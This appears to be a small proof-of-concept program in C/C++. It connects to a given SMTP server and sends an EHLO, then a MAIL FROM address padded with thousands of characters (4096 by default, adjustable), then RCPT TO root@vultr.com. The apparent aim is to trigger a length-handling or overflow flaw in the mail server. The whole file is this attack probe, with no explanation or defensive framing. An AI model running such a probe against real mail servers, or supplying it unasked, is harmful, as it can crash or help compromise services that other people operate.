#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char* argv[]) {
    sockaddr_in sin;
    hostent* hp  {nullptr};
    char* buffer {nullptr};

    int sock, i, paddinglen{4096};

    if (2 != argc && 3 != argc) {
        fprintf(stderr, "usage: %s <smtpserver> [padding len=4096]\n", argv[0]);
        exit(1);
    }

    if (argc == 3) {
        paddinglen = atoi(argv[2]);
    }

    hp = gethostbyname2(argv[1], AF_INET);
    if (nullptr == hp) {
        fprintf(stderr, "Unknown host: %s\n", argv[1]);
        return 1;
    }

    bzero((char*)&sin, sizeof(sin));
    bcopy(hp->h_addr, (char*)&sin.sin_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = htons(25);
    sock = socket(AF_INET, SOCK_STREAM, 0);

    connect(sock, (sockaddr*) &sin, sizeof(sin));
    buffer = (char*)calloc(1, 100000);

    read(sock, buffer, 100000 -1);

    bzero(buffer, 100000);
    sprintf(buffer, "EHLO ");
    for (i = 0; i<1; i++) {
        strcat(buffer, "x");
    }
    strcat(buffer, "\r\n");
    write(sock, buffer, strlen(buffer));
    read(sock, buffer, 10000);

    bzero(buffer, 100000);
    sprintf(buffer, "MAIL FROM:<bin");
    for (i = 0; i < paddinglen; i++) {
        strcat(buffer, "x");
    }
    strcat(buffer, "@vultr.com>\r\n");
    write(sock, buffer, strlen(buffer));
    read(sock, buffer, 10000);

    bzero(buffer, 100000);
    sprintf(buffer, "RCPT TO:<root");
    strcat(buffer, "@vultr.com>\r\n");
    write(sock, buffer, strlen(buffer));
    read(sock, buffer, 10000);

    close(sock);
    free(buffer);

    return 0;
}
